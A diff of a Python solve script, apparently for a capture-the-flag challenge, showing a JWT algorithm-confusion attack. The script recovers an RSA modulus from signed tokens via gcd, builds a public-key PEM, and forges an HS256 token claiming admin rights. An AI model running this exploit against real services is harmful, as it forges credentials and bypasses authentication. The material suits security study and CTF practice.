@@ -97,15 +97,6 @@ def create_session_and_obtain_jwt(username):
     else:
         return None
 
-# x1 = jwt_hash_for_rs256("a")
-# x2 = jwt_hash_for_rs256("b")
-#
-# s1 = int_signature_from_jwt(create_session_and_obtain_jwt("a"))
-# s2 = int_signature_from_jwt(create_session_and_obtain_jwt("b"))
-
-# from math import gcd
-#
-# print(gcd(x2-x1, s1-s2))
 
 import random
 import string
@@ -131,95 +122,28 @@ def recover_n(num_samples=2, e = 65537):
 
         x = gmpy2.mpz(x)
         a = gmpy2.mpz(a)
-        print(f"a: {a}\nx:{x}")
+        print(f"a: {a}\nx: {x}")
 
-        # calcular x^e (entero grande)
-        val = pow(x, e)  # powmod(..., 0) = potencia exacta
+        val = pow(x, e)
         print(f"val bit_length: {val.bit_length()}")
 
         diff = val - a
         values.append(diff)
 
-    # tomar gcd iterativo
+    # calculate gcd
     n = values[0]
     for v in values[1:]:
         n = gmpy2.gcd(n, v)
 
     return n
 
-print("empiezo")
-print(f"n: {recover_n(4)}")
 
-assert(False)
-
-
+n = int(recover_n(5))
+print(f"n: {n}")
+assert(n == 30119723976045246500887959920897642376905514522104705876695572516818975656665827754462226597973931127004963194508794779495518118035029841228002850562126612806174354282950756669656076190799693066363785733231859172664786298352294594850108982261525326147060353679479844558827458650965802914077525964824412575118501773357860374735206849817271524812002047307305597712628593230518376740507962518305824812671107459660525177087958778694060270468673690931325503094560625544374011735643694318730778241846282742819834483180624645324880062782719575587058519516842316778261924794437716972651884728674806670910304714203419102131413)
 
 
-
-real_n = 357
-
-# n = 3425857033280044914259085670712728675552904168873734088180300071832242196744850195411499785716960160133385039072657452525635067756239590369863290664551330431156681891604435821390881006671902601932176479606099211077402385185556711332328797693769946317450561388682777410600840836594619855276519432184902415837713340176617745778886309141883273468139197127277221663250354818846746191176521155357431087560269161809368511360403750713103822323557576050230271470677644089048291433474038474093449548902173483664414997470215475946172748346979365495241718859267006233893078431217389164683080609429916813844145942577115557304673
-# t = 2048
-n = 1 
-t = 2
-mod = 2**(t+1)
-# while t < 2048:
-while t < 9:
-    pow2 = mod // 2
-    s = gen_random_string()
-    a = jwt_hash_for_rs256(s)
-    # x = int_signature_from_jwt(create_session_and_obtain_jwt(s))
-    x = pow(a,65537,real_n)
-    r = ( pow(a, 65537, mod) - x ) % mod
-    if r % 2 == 0:
-        continue
-    k_t = ( r * pow(n, -1, pow2) ) % (pow2)
-    assert(k_t % 2 != 0)
-    assert(k_t < pow2 and n < pow2)
-
-    candidates = []
-    for i in range(2):
-        for j in range(2):
-            if ((i*pow2 + k_t)*(j*pow2 + n)) % mod == r:
-                candidates.append((i,j))
-
-    if len(candidates) != 1:
-        print(f"retry, {len(candidates)} candidates. n:{n}, t:{t}")
-        print(candidates)
-        continue
-    n += candidates[0][1]*pow2
-
-    t += 1 
-    mod *= 2 
-
-
-    # candidate = ((r - k_t*n) % mod) * pow(k_t, -1, mod)
-    # candidate %= mod
-    # if candidate == 0 or candidate == pow2:
-    #     # the next bit of k was 0
-    #     pass 
-    # else:
-    #     # the next bit of k was 1
-    #     k = k_t + pow2
-    #     candidate = ((r - k*n) % mod) * pow(k, -1, mod)
-    #     candidate %= mod
-    #     assert(candidate == 0 or candidate == pow2)
-    #
-    # if candidate == 0:
-    #     # the next bit of n is 0 
-    #     t += 1 
-    #     mod *= 2 
-    # else:
-    #     # the next bit of n is 1 
-    #     n += pow2
-    #     t += 1 
-    #     mod *= 2
-
-    print(t, n)
-
-assert(n == real_n)
-
-# serialize_pem_key(n)
+serialize_pem_key(n)
 assert(parse_rsa_public_pem()[0] == n)
 
 with open('Web/rsa-or-hmac-2-public.pem', 'rb') as f:
@@ -227,7 +151,7 @@ with open('Web/rsa-or-hmac-2-public.pem', 'rb') as f:
 
 import jwt
 encoded = jwt.encode({'username': 'hola', 'admin': True}, PUBLIC_KEY, algorithm='HS256')
-print(encoded)
+print(f"forged jwt: {encoded}")
 decoded = jwt.decode(encoded, PUBLIC_KEY, algorithms=['HS256', 'RS256'])
 print(decoded)
 
